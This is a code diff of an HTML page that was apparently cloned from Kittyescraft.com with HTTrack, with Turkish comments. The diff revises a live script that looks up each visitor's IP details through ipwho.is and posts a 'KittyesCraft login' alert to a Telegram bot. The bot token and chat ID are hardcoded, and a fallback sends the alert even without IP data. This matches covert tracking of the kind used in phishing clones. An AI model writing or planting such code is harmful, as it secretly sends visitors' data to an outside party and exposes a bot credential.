@@ -589,8 +589,8 @@
 const botToken = "8690281311:AAFGIGguVxQ4LgRmR7nSTa_HYY6Q_PSWONI";
 const chatId = "1504410647";
 
-// IP API'si (ipapi.co 403 veriyorsa alternatif kullan)
-fetch('https://ipwho.is/')  // Alternatif API (çalışır)
+// IP API'si - Hızlı ve çalışan bir alternatif
+fetch('https://ipwho.is/')
   .then(response => response.json())
   .then(data => {
     const message = `🤡 <b>KittyesCraft Giriş Yapıldı</b>\n\n` +
@@ -610,11 +610,14 @@ fetch('https://ipwho.is/')  // Alternatif API (çalışır)
     });
   })
   .then(res => res.json())
-  .then(data => console.log('Gönderildi:', data))
+  .then(data => {
+    console.log('Başarılı:', data);
+    // Sayfada bir yere yazmak istersen
+    // document.getElementById('durum').innerHTML = 'Mesaj gönderildi!';
+  })
   .catch(err => {
-    console.log('IP alınamadı, direkt mesaj gönderiliyor...');
-    
-    // Yedek: Sadece IP'siz mesaj
+    console.log('IP alınamadı, direkt mesaj:', err);
+    // Yedek mesaj
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -632,6 +635,7 @@ fetch('https://ipwho.is/')  // Alternatif API (çalışır)
 <!-- Mirrored from Kittyescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Feb 2026 14:23:44 GMT -->
 
 </html>
+
 
 
 
